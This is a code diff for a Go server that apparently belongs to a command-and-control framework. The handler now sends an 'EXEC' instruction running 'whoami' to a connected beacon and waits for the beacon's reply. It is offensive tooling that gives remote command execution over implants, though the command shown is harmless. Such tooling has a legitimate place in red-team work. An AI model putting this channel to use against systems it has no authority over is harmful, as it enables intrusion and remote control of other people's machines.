@@ -1,10 +1,11 @@
 package main
 
 import (
-	"bufio"
 	"fmt"
 	"log"
 	"net"
+
+	"github.com/BradHacker/titan/models"
 )
 
 const (
@@ -32,22 +33,27 @@ func main() {
 }
 
 func handleConnection(conn net.Conn) {
-	defer conn.Close()
+	defer CloseConnection(conn)
 
-	buffer, err := bufio.NewReader(conn).ReadBytes(0xff)
-
+	testInstruction := generateTestInstruction()
+	err := SendInstruction(testInstruction, conn)
 	if err != nil {
-		fmt.Println("Client dropped the connection")
+		fmt.Printf("Something went wrong while sending instruction: %v\n", err)
 		return
 	}
 
-	if len(buffer) > 0 {
-    buffer = buffer[:len(buffer)-1]
+	err = WaitForBeaconReturn(conn)
+	if err != nil {
+		log.Fatal(fmt.Errorf("Error while waiting for Beacon response: %v", err))
+	}
 }
 
-	receivedBeacon, err := DecodeBeacon(buffer)
-	if err != nil {
-		fmt.Printf("Couldn't decode beacon: %v", err)
-	}
-	fmt.Printf(receivedBeacon.String())
+func generateTestInstruction() (instruction models.Instruction) {
+	var testAction models.Action
+
+	testAction.ActionType = "EXEC"
+	testAction.Cmd = "whoami"
+
+	instruction.Action = testAction
+	return
 }
